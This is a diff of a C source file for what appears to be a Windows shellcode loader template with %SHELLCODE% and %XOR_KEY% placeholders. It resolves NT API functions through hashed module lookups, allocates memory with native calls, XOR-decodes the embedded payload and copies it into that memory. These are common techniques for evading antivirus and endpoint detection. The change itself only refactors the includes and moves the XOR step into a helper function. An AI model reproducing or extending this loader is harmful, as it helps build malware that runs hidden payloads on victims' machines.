@@ -1,8 +1,4 @@
-#include <windows.h>
-#include <stdio.h>
-
-#define TRUE 1
-#define FALSE 0
+#include "config.h"
 
 typedef NTSYSAPI NTSTATUS (NTAPI* NtAllocVirtMem)(
     HANDLE ProcessHandle,
@@ -48,7 +44,6 @@ typedef NTSYSAPI NTSTATUS(NTAPI* NtWaitForSingleObj)(
     BOOLEAN Alertable,
     PLARGE_INTEGER Timeout
 );
-
 
 HMODULE CustomGetModuleHandle(unsigned int module_hash) {
     #ifdef _WIN64
@@ -172,6 +167,7 @@ void main() {
     unsigned char payload[] = "%SHELLCODE%";
 
     SIZE_T regionSize = sizeof(payload);
+    BYTE key = %XOR_KEY%;
     PVOID exec = NULL;
     DWORD old_protect = 0;
     HANDLE th;
@@ -197,9 +193,7 @@ void main() {
     _NtAlocVirtMem((HANDLE)-1, &exec, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     
     // XORing shellcode
-    for (size_t i = 0; i < sizeof(payload); i++) {
-        payload[i] ^= %XOR_KEY%;
-    }
+    XOR(payload, sizeof(payload), key);    
     
     // Copy shellcode into allocated memory
     _NtWriteVirtMem((HANDLE)-1, exec, payload, sizeof(payload), NULL);
